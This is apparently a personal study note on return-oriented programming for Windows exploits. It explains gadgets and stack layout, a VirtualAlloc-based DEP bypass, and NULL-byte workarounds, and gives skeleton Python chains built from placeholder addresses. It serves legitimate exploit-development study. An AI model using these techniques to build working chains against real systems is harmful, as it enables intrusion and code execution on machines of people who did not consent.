---
tags:
  - Advanced
  - Binary_Exploitation
  - Debugging
  - Exploitation
  - ROP
  - WinDbg
  - Windows
---

## Return Oriented Programming
resources: [ROP Paper](https://cseweb.ucsd.edu/~hovav/dist/geometry.pdf)

> Chain small instruction sequences (gadgets) to perform arbitrary operations without injecting new code.

### ROP Fundamentals [Knowledge]
> [!info] How ROP chains execute:
> 1. Overflow overwrites return address with first gadget address
> 2. When function returns, execution jumps to gadget
> 3. Gadget executes instructions, ends with RET
> 4. RET pops next address from stack, jumps to next gadget
> 5. Chain continues until desired operations complete

### Gadget Structure [Knowledge]
> What constitutes a useful gadget.

```text
Gadget: One or more instructions followed by RET (C3)

Examples:
pop eax; ret          ; Load value into EAX
pop ecx; ret          ; Load value into ECX
xchg eax, esp; ret    ; Stack pivot
mov [eax], ecx; ret   ; Write ECX to address in EAX
```

### Stack Layout for ROP
> How to arrange values on stack for gadgets.

```text
Stack (growing down):           Execution:
+------------------+
| gadget1 addr     | <-- ESP    1. RET pops gadget1, jumps there
+------------------+
| value for pop    |            2. gadget1: pop eax; ret
+------------------+               EAX = value, RET pops gadget2
| gadget2 addr     |            3. gadget2 executes...
+------------------+
| ...              |
```

### ROP to Call VirtualAlloc [Knowledge]
> [!info] Strategy to allocate executable memory:
> **Goal**: Call `VirtualAlloc(addr, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)`
>
> **Steps**:
> 1. Find **VirtualAlloc** address (in IAT or dynamically)
> 2. Set up registers/stack with arguments
> 3. Call VirtualAlloc via gadget
> 4. Copy shellcode to allocated memory
> 5. Jump to shellcode

### VirtualAlloc Parameters
> Arguments for VirtualAlloc call.

```c
LPVOID VirtualAlloc(
    LPVOID lpAddress,        // Address (or NULL for any)
    SIZE_T dwSize,           // Size to allocate
    DWORD  flAllocationType, // MEM_COMMIT | MEM_RESERVE (0x3000)
    DWORD  flProtect         // PAGE_EXECUTE_READWRITE (0x40)
);
```

### Common ROP Patterns
> Useful gadget sequences.

```text
; Stack to register
pop eax; ret                    ; Load stack value to EAX
pop ecx; pop ecx; ret           ; Load two values, keep second

; Register manipulation
xchg eax, ecx; ret              ; Swap EAX and ECX
mov eax, ecx; ret               ; Copy ECX to EAX
inc eax; ret                    ; Increment EAX

; Memory operations
mov [eax], ecx; ret             ; Write ECX to [EAX]
mov eax, [eax]; ret             ; Dereference pointer

; Arithmetic
add eax, ecx; ret               ; Add ECX to EAX
sub eax, ecx; ret               ; Subtract

; Stack manipulation
pushad; ret                     ; Save all registers
add esp, X; ret                 ; Adjust stack pointer
xchg eax, esp; ret              ; Stack pivot
```

### Skeleton ROP Chain
> Basic structure for VirtualAlloc ROP.

```python
import struct

def p32(addr):
    return struct.pack("<I", addr)

# Gadget addresses (example)
POP_EAX = 0x10001000
POP_ECX = 0x10001004
MOV_EAX_ECX = 0x10001008
# ... more gadgets

# Build chain
rop = b""
rop += p32(POP_EAX)
rop += p32(0x41414141)      # Value for EAX
rop += p32(POP_ECX)
rop += p32(0x42424242)      # Value for ECX
# ... continue building

# Final payload
buffer = b"A" * offset
buffer += rop
buffer += shellcode
```

### ROP Chain for VirtualAlloc
> Complete chain to call VirtualAlloc.

```python
# Addresses (adjust for target)
VIRTUALALLOC_IAT = 0x10001000   # Address of VirtualAlloc pointer
POP_EAX_RET = 0x10002000
XCHG_EAX_ESP_RET = 0x10003000
# ... more gadgets

# Stack after pivot:
rop = b""
rop += p32(VIRTUALALLOC_IAT)    # Function to call
rop += p32(SHELLCODE_ADDR)      # Return address after VirtualAlloc
rop += p32(0x00000000)          # lpAddress (NULL = any)
rop += p32(0x00001000)          # dwSize
rop += p32(0x00003000)          # MEM_COMMIT | MEM_RESERVE
rop += p32(0x00000040)          # PAGE_EXECUTE_READWRITE
```

### Handling NULL Bytes in ROP
> Avoid NULL bytes in gadget addresses.

```text
; If gadget at 0x10001000 (contains NULL):
1. Find equivalent gadget without NULLs
2. Use negative value and adjust: 0xF0001000 - 0xE0000000
3. Build address at runtime using arithmetic
```

